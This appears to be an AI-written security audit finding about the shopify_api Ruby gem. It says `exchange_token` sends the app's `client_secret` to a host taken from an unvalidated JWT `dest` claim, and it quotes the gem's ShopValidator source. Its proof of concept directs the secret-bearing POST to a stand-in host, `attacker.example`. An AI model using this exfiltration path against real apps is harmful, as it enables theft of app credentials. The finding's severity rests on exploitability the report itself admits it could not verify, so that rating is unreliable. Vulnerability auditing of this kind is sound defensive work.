Found it: `exchange_token` in `token_exchange.rb` is the exact analog. Every other credential-issuing path in this gem (`migrate_to_expiring_token`, `client_credentials`, `refresh_access_token`) runs `shop` through `Utils::ShopValidator.sanitize!` before using it to build the request host that receives `client_secret` [1](#0-0) [2](#0-1) [3](#0-2) . `exchange_token`, however, takes `dest_shop` straight from the JWT's `dest` claim and never validates it before it becomes the HTTP host that the `client_secret` is POSTed to [4](#0-3) .

### Title
Unvalidated JWT `dest` claim used as request host lets a crafted session token exfiltrate `client_secret` via SSRF - (File: lib/shopify_api/auth/token_exchange.rb)

### Summary
`TokenExchange.exchange_token` builds the token-exchange request host directly from the unvalidated `dest` claim of the caller-supplied session token, unlike every sibling credential-issuing method in the gem, which sanitizes `shop` with `Utils::ShopValidator.sanitize!` first.

### Finding Description
`JwtPayload#shop` simply strips `"https://"` off the `dest` claim with no format or domain check: `@dest.gsub("https://", "")` [5](#0-4) . `JwtPayload.new` only verifies the signature and the `aud` claim; it never checks that `dest` is a trusted Shopify domain [6](#0-5) .

`exchange_token` takes this unvalidated value (`dest_shop = jwt_payload.shop`) and uses it, unsanitized, to build the `Session`/`HttpClient` that the `client_id`/`client_secret` body is POSTed to: `shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)` then `Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")` [7](#0-6) . `HttpClient` builds the actual request URL from `session.shop`, so whatever string is in `dest` becomes the network destination for a request carrying `Context.api_secret_key`.

Contrast this with the three sibling methods that also send `client_secret` over the wire: `migrate_to_expiring_token`, `client_credentials`, and `refresh_access_token` all call `Utils::ShopValidator.sanitize!(shop)` before constructing the session/host [1](#0-0) [2](#0-1) [3](#0-2) . `ShopValidator.sanitize!` explicitly restricts the host to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) or a configured `myshopify_domain`, raising `InvalidShopError` otherwise [8](#0-7) . `exchange_token` skips this check entirely.

The identity binding broken here is: **the host that receives `client_id`/`client_secret` must equal a value bound to a trusted Shopify domain**, but in `exchange_token` the host equals an *unvalidated* JWT claim instead of a `ShopValidator`-approved value — i.e. `host_used_for_secret_POST == raw(dest_claim)` rather than `host_used_for_secret_POST == ShopValidator.sanitize!(dest_claim)`.

Whether this is remotely exploitable hinges on whether `dest` is itself bound to `iss`/signature scope by Shopify's session-token issuance (i.e., whether Shopify only ever issues a token with a merchant-controlled arbitrary `dest`, or whether `dest` is always constrained to the issuing shop's own domain). I could not fully verify from this repo alone whether Shopify's session-token issuance process constrains `dest` to a `*.myshopify.com`/trusted value or whether it is attacker-influenceable in any embedding scenario (e.g. custom domains, `spin.dev`/dev-store proxies, or malformed/relayed tokens accepted due to `Context.old_api_secret_key` fallback covering rotated-but-still-trusted secrets). This is a gap in the gem's defense-in-depth regardless: it is the only credential-transmitting method that omits the `ShopValidator` check that its siblings apply as a deliberate safety net.

### Impact Explanation
If `dest` can be influenced to a non-Shopify host (through token relay, malformed/dev-domain tokens, or any issuance path not strictly bound to a trusted domain), the app's `client_secret` and `client_id` are sent via SSRF to an attacker-controlled server — Critical/High impact (credential exfiltration of the app's `client_secret` via SSRF), matching the impact categories explicitly in scope.

### Likelihood Explanation
Medium: exploitation requires a session token whose `dest` claim is not a trusted Shopify domain reaching `exchange_token` unmodified. The signature check limits forgery to holders of `api_secret_key`/`old_api_secret_key`, but the code path itself provides no host allow-listing, unlike its siblings — an inconsistency that is a defense-in-depth gap independent of how `dest` gets populated upstream.

### Recommendation
Apply `Utils::ShopValidator.sanitize!(dest_shop)` (or an equivalent check restricting to trusted Shopify domains / the configured `myshopify_domain`) before building `shop_session` in `exchange_token`, mirroring `migrate_to_expiring_token`, `client_credentials`, and `refresh_access_token`.

### Proof of Concept
1. Obtain/construct a session token whose `dest` claim resolves to a non-Shopify host reachable by the app server (e.g. `https://attacker.example`), signed or accepted per whatever issuance/verification path is in play.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
3. Observe that `Clients::HttpClient` issues `POST https://attacker.example/admin/oauth/access_token` with body containing `client_id` and `client_secret` [9](#0-8)  — no `ShopValidator` check rejects the non-trusted host, unlike the equivalent call in `client_credentials.rb`/`refresh_token.rb`/`migrate_to_expiring_token`.

          "shopify.com",

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
